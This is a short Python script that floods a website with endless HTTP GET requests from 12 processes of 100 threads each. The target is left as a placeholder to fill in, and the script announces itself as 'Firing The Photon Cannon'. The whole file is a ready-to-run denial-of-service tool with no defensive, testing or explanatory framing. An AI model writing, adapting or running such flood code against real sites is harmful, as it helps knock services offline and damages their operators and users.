import requests, threading
from multiprocessing import Process

number_procs = 12
number_threads = 100
hostname = "{{INSERT_WEBSITE_HERE}}"

class RequestThread(threading.Thread):
    def run(self):
        while True:
            requests.get(f"https://{hostname}/")

def request(number_threads):
    threads = []
    for i in range(number_threads):
        t = RequestThread()
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == '__main__':
    procs = []
    print(f"Firing The Photon Cannon: Powerlevel {number_procs} - {number_threads}!!!")
    for i in range(number_procs):
        p = Process(target=request, args=(number_threads,))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()
    print("Launch Complete...")
